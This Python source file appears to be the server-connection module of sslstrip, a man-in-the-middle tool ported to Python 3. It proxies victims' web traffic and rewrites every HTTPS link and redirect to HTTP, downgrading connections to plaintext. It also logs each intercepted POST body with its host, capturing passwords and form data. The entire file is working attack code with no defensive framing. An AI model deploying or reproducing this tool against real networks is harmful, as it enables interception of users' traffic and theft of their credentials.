# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
import gzip
import logging
import re
import io
from twisted.web.http import HTTPClient
from .URLMonitor import URLMonitor

def safe_str(obj):
    if isinstance(obj, bytes):
        return obj.decode('utf-8', errors='ignore')
    return str(obj)

class ServerConnection(HTTPClient):
    """ The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    """

    urlExpression = re.compile(rb"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType = re.compile(rb"https://", re.IGNORECASE)
    urlExplicitPort = re.compile(rb'https://([a-zA-Z0-9.]+):[0-9]+/', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command = command
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.client = client
        self.urlMonitor = URLMonitor.getInstance()
        self.isImageRequest = False
        self.isCompressed = False
        self.contentLength = None
        self.shutdownComplete = False

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s" % (safe_str(self.command), safe_str(self.uri)))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (safe_str(header), safe_str(value)))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        host = self.headers.get(b'host', b'')
        if not host:
             host = self.headers.get('host', '') 
        
        logging.warning(self.getPostPrefix() + " Data (" + safe_str(host) + "):\n" + safe_str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()

        if self.command == b'POST' or self.command == 'POST':
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (safe_str(version), safe_str(code), safe_str(message)))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (safe_str(key), safe_str(value)))
        
        # Key is likely bytes, so compare with bytes or decode
        key_lower = key.lower() if isinstance(key, bytes) else key.lower().encode('utf-8')
        value_lower = value.lower() if isinstance(value, bytes) else value.lower().encode('utf-8')

        if key_lower == b'location':
            value = self.replaceSecureLinks(value)

        if key_lower == b'content-type':
            if value_lower.find(b'image') != -1:
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if key_lower == b'content-encoding':
            if value_lower.find(b'gzip') != -1:
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif key_lower == b'content-length':
            self.contentLength = value
        elif key_lower == b'set-cookie':
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
        if self.isImageRequest and self.contentLength != None:
            self.client.setHeader(b"Content-Length", self.contentLength)

        if self.length == 0:
            self.shutdown()

    def handleResponsePart(self, data):
        if self.isImageRequest:
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if self.isImageRequest:
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if self.isCompressed:
            logging.debug("Decompressing content...")
            # Fix gzip handling for bytes
            try:
                data = gzip.GzipFile('', 'rb', 9, io.BytesIO(data)).read()
            except Exception as e:
                logging.error("Gzip error: " + str(e))

        logging.log(self.getLogLevel(), "Read from server:\n" + safe_str(data))

        data = self.replaceSecureLinks(data)

        if self.contentLength != None:
            self.client.setHeader(b'Content-Length', str(len(data)).encode('utf-8'))

        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + safe_str(url))

            url = url.replace(b'https://', b'http://', 1)
            url = url.replace(b'&amp;', b'&')
            # urlMonitor expects bytes (we patched it)
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        # explicit port regex sub
        data = re.sub(ServerConnection.urlExplicitPort, rb'http://\1/', data)
        return re.sub(ServerConnection.urlType, b'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()
